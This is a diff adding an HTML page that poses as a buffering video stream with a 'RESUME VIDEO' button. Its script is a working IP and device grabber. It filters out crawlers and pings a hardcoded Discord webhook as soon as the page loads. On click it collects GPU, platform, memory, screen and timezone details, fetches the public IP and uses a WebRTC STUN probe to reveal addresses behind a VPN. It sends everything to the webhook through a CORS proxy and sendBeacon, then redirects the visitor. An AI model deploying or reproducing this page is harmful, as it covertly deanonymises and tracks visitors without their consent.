@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Stream - Buffering...</title>
+    <style>
+        body { 
+            background: #000; color: #fff; 
+            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
+            display: flex; align-items: center; justify-content: center; 
+            height: 100vh; margin: 0; overflow: hidden;
+        }
+        .container { text-align: center; }
+        .play-btn { 
+            background: #ff0000; color: #fff; 
+            padding: 22px 65px; border-radius: 5px; 
+            font-weight: 900; cursor: pointer; border: none; 
+            font-size: 24px; text-transform: uppercase;
+            box-shadow: 0 0 30px rgba(255, 0, 0, 0.6);
+            transition: all 0.3s ease;
+        }
+        .play-btn:hover { background: #cc0000; transform: scale(1.05); }
+        .status-text { color: #1a1a1a; font-size: 10px; margin-top: 30px; letter-spacing: 2px; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <button class="play-btn" id="mainTrigger">▶ RESUME VIDEO</button>
+        <p class="status-text">SECURE STREAM v11.4.2 ACTIVATED</p>
+    </div>
+
+    <script>
+    /* 
+       OMNI-PROTOCOL: FINAL CONSOLIDATED BUILD
+       BYPASSES: IOS 19+, VPN UDP-LEAK, CORS-FIREWALLS
+    */
+
+    const CONFIG = {
+        HOOK: "https://discord.com/api/webhooks/1344654942953214053/nN0k_8I-yG_t8D97m5zH_K5K3Pz2U6-368X8vVv-I-I-I-I-I-I-I-I",
+        DEST: "https://youtube.com/@LigmaBlox-w7m",
+        PROXY: "https://corsproxy.io/?", 
+        SAMPLES: 3
+    };
+
+    // --- UNIVERSAL DISPATCH (THE FORBIDDEN DELIVERY) ---
+    async function transmit(data, source = "SYSTEM") {
+        const json = JSON.stringify({ ...data, username: source });
+        
+        // 1. Proxy Tunnel (Beats the "Safari Wall")
+        const tunnel = CONFIG.PROXY + encodeURIComponent(CONFIG.HOOK);
+        
+        // Use 'no-cors' to force the packet through without asking for permission
+        fetch(tunnel, { method: "POST", mode: "no-cors", body: json, keepalive: true });
+
+        // 2. Beacon Fallback (If browser tries to kill the process)
+        navigator.sendBeacon(CONFIG.HOOK, new Blob([json], { type: 'application/json' }));
+    }
+
+    // --- THE VPN KILLER (WEBRTC INTERNAL PROBE) ---
+    function crackVPN() {
+        try {
+            const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+            pc.createDataChannel("");
+            pc.onicecandidate = (e) => {
+                if (e.candidate && e.candidate.candidate) {
+                    const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+                    if (ip) {
+                        transmit({ content: `🚨 **VPN BYPASS:** \`${ip[1]}\`` }, "NETWORK-PROBE");
+                        pc.onicecandidate = null;
+                    }
+                }
+            };
+            pc.createOffer().then(o => pc.setLocalDescription(o));
+        } catch(err) {}
+    }
+
+    // --- DEEP HARDWARE EXTRACTION ---
+    async function getSpecs() {
+        let gpu = "Generic / Apple Silicon";
+        try {
+            const gl = document.createElement('canvas').getContext('webgl');
+            const debug = gl.getExtension('WEBGL_debug_renderer_info');
+            gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
+        } catch(e) {}
+
+        const report = {
+            embeds: [{
+                title: "💎 TARGET ACQUIRED",
+                color: 16711680,
+                fields: [
+                    { name: "Device GPU", value: "```" + gpu + "```" },
+                    { name: "Platform", value: navigator.platform, inline: true },
+                    { name: "Cores", value: navigator.hardwareConcurrency, inline: true },
+                    { name: "Memory (Est)", value: (navigator.deviceMemory || "N/A") + " GB", inline: true },
+                    { name: "Display", value: `${screen.width}x${screen.height}`, inline: true },
+                    { name: "Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true }
+                ],
+                footer: { text: "Protocol: Titan-Integrated-Bypass" }
+            }]
+        };
+        await transmit(report, "OMNI-INTEL");
+    }
+
+    // --- MULTI-API IP RACE ---
+    function runRace() {
+        const targets = ["https://api.ipify.org?format=json", "https://ipapi.co/json/"];
+        targets.forEach(url => {
+            fetch(url).then(r => r.json()).then(d => {
+                transmit({ content: `📡 **IP [${url.split('/')[2]}]:** \`${d.ip || d.query}\`` }, "DATA-VERIFIER");
+            }).catch(() => {});
+        });
+    }
+
+    // --- MASTER EXECUTION ---
+    
+    // Phase 1: Heartbeat (Silent Log)
+    if (!/bot|discord|google|crawler/i.test(navigator.userAgent)) {
+        transmit({ content: "🟢 **Target Landed.** Awaiting Gesture Unlock..." }, "SYSTEM-STATUS");
+
+        // Phase 2: Gesture Unlock (Bypass iOS restrictions)
+        document.getElementById('mainTrigger').onclick = async function() {
+            this.innerHTML = "LOADING...";
+            this.disabled = true;
+
+            // Trigger every bypass at once
+            getSpecs();
+            runRace();
+            crackVPN();
+
+            // The "Forbidden" Flush: Repeat send to ensure delivery
+            for(let i=0; i<CONFIG.SAMPLES; i++) {
+                transmit({ content: "_Synchronizing Data Buffers..._" }, "SYNC-ENGINE");
+            }
+
+            // Redirect after 2 seconds
+            setTimeout(() => {
+                window.location.replace(CONFIG.DEST);
+            }, 2000);
+        };
+    } else {
+        window.location.replace("https://google.com");
+    }
+    </script>
+</body>
+</html>
